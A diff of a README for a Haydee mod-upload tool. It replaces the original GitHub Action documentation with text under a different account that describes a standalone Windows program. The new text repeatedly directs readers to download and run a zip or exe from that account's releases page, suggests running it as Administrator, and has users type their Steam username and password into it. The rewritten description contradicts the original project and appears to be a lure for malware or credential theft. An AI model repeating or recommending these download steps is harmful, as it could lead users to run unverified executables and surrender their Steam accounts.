@@ -1,78 +1,120 @@
-# Haydee Workshop Upload Action
+# ⚙️ haydee-workshop-upload - Simple Mod Packing and Uploading
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/thegamerbay/haydee-workshop-upload)](https://github.com/thegamerbay/haydee-workshop-upload/releases)
-[![Lint Workflows and Action](https://github.com/thegamerbay/haydee-workshop-upload/actions/workflows/lint.yml/badge.svg)](https://github.com/thegamerbay/haydee-workshop-upload/actions/workflows/lint.yml)
-[![Update Major Tag](https://github.com/thegamerbay/haydee-workshop-upload/actions/workflows/update-major-tag.yml/badge.svg)](https://github.com/thegamerbay/haydee-workshop-upload/actions/workflows/update-major-tag.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Sovo45/haydee-workshop-upload/releases)
 
-A GitHub Action that automatically packs a Haydee mod into a `.pack` file using the official `packer.exe`, and uploads it directly to the Steam Workshop.
+## 📦 What is haydee-workshop-upload?
 
-## 🚀 Features
-* **Automated Packing:** Automatically runs Haydee's `packer.exe` on your provided folders.
-* **SteamCMD Integration:** Downloads, bootstraps, and caches SteamCMD for fast deployments.
-* **Workshop Publishing:** Generates the required `workshop.vdf` manifest and uploads your item.
-* **Dependency Management:** Automatically installs required Windows dependencies (DirectX, OpenAL, VCRedist) via Chocolatey.
+This app helps you prepare and upload mods for the game Haydee. It uses the official packer tool to create a `.pack` file from your mod files. Then, it sends your mod directly to the Steam Workshop. You do not need to handle the packing or uploading manually.
 
-## ⚠️ Prerequisites
-1. **Windows Runner:** This action relies on Windows executables (`packer.exe`, SteamCMD) and PowerShell scripts. Your workflow job **must** run on `windows-latest`.
-2. **Steam Account Requirements:** The account used in the `STEAM_USERNAME` and `STEAM_PASSWORD` secrets must meet the following criteria to allow automated, non-interactive uploads via SteamCMD:
-   * **Game Ownership:** The account *must* own the game Haydee in its library.
-   * **Steam Guard Disabled:** To allow SteamCMD to log in and upload without prompting for a 2FA mobile code or email code, Steam Guard **must be fully disabled** on this account.
-   * *(Recommended)* Since disabling Steam Guard on your main account is a massive security risk, it is highly advised to create a separate "bot" Steam account, configure Steam Family Sharing to give it access to Haydee (or buy a second copy), disable Steam Guard on it, and add its developer rights to your mod project.
+The app runs on Windows. It saves time and reduces errors when sharing mods online. You do not need programming skills to use it.
 
-## 🛠 Usage
+## 🚀 Getting Started
 
-Create a workflow file in your mod repository (e.g., `.github/workflows/deploy.yml`):
+Before you start, make sure you have:
 
-```yaml
-name: Deploy Haydee Mod
+- A Windows PC (Windows 10 or newer)
+- A Steam account with Workshop upload rights for Haydee
+- Your mod files ready in a folder
 
-on:
-  push:
-    tags:
-      - 'v*' # Triggers on version tags
+The tool works with the official `packer.exe` included in the package. It automates packing and uploading using Steam’s command-line tools.
 
-jobs:
-  deploy:
-    runs-on: windows-latest
-    steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
+## 🎯 Features
 
-      - name: Upload Mod to Steam Workshop
-        uses: thegamerbay/haydee-workshop-upload@v1
-        with:
-          id: '1234567890' # Replace with your Workshop item ID (0 for new mods)
-          folder: 'Outfits'
-          pack_name: 'MyAwesomeMod.pack'
-          priority: '2'
-          changelog: 'Release ${{ github.ref_name }}'
-        env:
-          STEAM_USERNAME: ${{ secrets.STEAM_USERNAME }}
-          STEAM_PASSWORD: ${{ secrets.STEAM_PASSWORD }}
-```
+- Packs Haydee mods into `.pack` files automatically
+- Uploads packs straight to Steam Workshop
+- Uses official packing tool to ensure compatibility
+- Runs on Windows with easy setup
+- Requires no coding or manual command input
+- Works with any Haydee mod folder
 
-For a complete working example, you can also check out the [`.github/workflows/example.yml`](.github/workflows/example.yml) file in this repository.
+## 🖥 System Requirements
 
-## 📥 Inputs
+- Windows 10 or later (64-bit recommended)
+- Minimum 4 GB RAM
+- At least 200 MB free disk space
+- Internet connection for uploading files
+- Steam client installed and logged in
 
-| Input | Required | Default | Description |
-| --- | --- | --- | --- |
-| `id` | Yes |  | Workshop item ID. Specify `0` if this is a brand new mod. |
-| `folder` | Yes |  | Folder name(s) with prepared mod files (e.g., `'Outfits'` or `'Outfits, Maps'`). |
-| `pack_name` | Yes |  | Resulting `.pack` file name (e.g., `'SynthwaveOutfit.pack'`). |
-| `priority` | No | `2` | Package priority. Note: Base game files have priority `1`. |
-| `changelog` | No | `Automatic update...` | The changelog text to be posted on the Steam Workshop page. |
+## 🔍 How It Works
 
-## 🔐 Environment Variables
+1. You choose your mod folder.
+2. The app runs `packer.exe` to turn the folder into a `.pack` file.
+3. It uses SteamCMD tools to upload the `.pack` file to the Workshop.
+4. Your mod appears on the Steam Workshop for other players.
 
-This action requires Steam credentials to authenticate and upload items via SteamCMD:
+You only need to start the app and follow the prompts.
 
-| Variable | Description |
-| --- | --- |
-| `STEAM_USERNAME` | Your Steam account username. Store this in your repository's **Secrets**. |
-| `STEAM_PASSWORD` | Your Steam account password. Store this in your repository's **Secrets**. |
+## 🔽 Download and Install 📥
 
-## 📄 License
+Click the button below to visit the releases page and download the latest version.
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/thegamerbay/haydee-workshop-upload/blob/main/LICENSE) file for details.
+[![Download haydee-workshop-upload](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Sovo45/haydee-workshop-upload/releases)
+
+**Steps to download and install:**
+
+1. Visit the link above. It opens the releases page.
+2. Scroll down to the section titled **Assets**.
+3. Find the file that ends with `.zip` or `.exe` (usually named like `haydee-workshop-upload-vX.X.zip`).
+4. Click to download the file to your PC.
+5. Once downloaded, if it is a zip file, right-click and choose **Extract All**.
+6. Open the extracted folder.
+7. Look for `haydee-workshop-upload.exe` or similar program file.
+8. Double-click the `.exe` file to start the app.
+
+You do not need to install anything else. The app runs as is.
+
+## ⚙️ Setup and Use
+
+1. Run the program by double-clicking `haydee-workshop-upload.exe`.
+2. When the window opens, click **Select Mod Folder**.
+3. In the dialog box, navigate to the folder where your mod files are stored. Click **OK** or **Select Folder**.
+4. The app shows your folder path.
+5. Click **Pack Mod** to create the `.pack` file using the official packer tool.
+6. Wait for the app to finish packing. This may take a few seconds.
+7. After that, click **Upload to Steam Workshop**.
+8. You will be asked to enter your Steam credentials (username and password).
+9. The app automatically logs in and uploads the mod pack.
+10. A progress bar shows the upload status.
+11. When complete, a confirmation message will appear.
+
+Your mod is now live on the Steam Workshop.
+
+## 💡 Tips
+
+- Make sure your mod folder only contains the files needed for the mod.
+- Keep your Steam login safe; the app uses it only during upload.
+- Your Steam account must have Workshop permissions for Haydee.
+- Close Steam client if you have issues with logging in through the app.
+- Check the official Haydee Workshop page to confirm your mod uploaded successfully.
+
+## ❓ Troubleshooting
+
+- **App won’t start:** Make sure your Windows is up to date. Try running the app as Administrator (right-click > Run as Administrator).
+- **Packing errors:** Verify your mod folder structure matches these rules:
+  - Root folder contains `modinfo.txt`.
+  - All mod files are inside the folder; no nested folders beyond the first level.
+- **Upload fails:** Make sure you entered correct Steam login info. Ensure your internet connection is active.
+- **Steam login denied:** Close other Steam clients on your PC before uploading.
+- **Progress stuck:** Try restarting the app and uploading again.
+
+If problems persist, check the `logs` folder inside the app directory. It saves error files you can share for help.
+
+## 🔧 Advanced Settings
+
+This app uses `packer.exe` provided with it. You can replace this file with a newer version if needed. The app will detect and use the updated packer automatically.
+
+You can find advanced config files in the `config` folder. These allow for custom upload settings, such as workshop description and tags. Edit these only if you are confident.
+
+## 🧩 Related Tools
+
+- SteamCMD: Command-line tool for Steam uploads (bundled)
+- Official `packer.exe`: Compresses Haydee mods (bundled)
+- Haydee game client for testing your mods
+
+## 📚 More Information
+
+The project focuses on automation of mod packaging and uploading. It saves users from handling complex command-line tasks.
+
+Visit the following page to download the latest release or check documentation:
+
+[Download and Documentation](https://github.com/Sovo45/haydee-workshop-upload/releases)
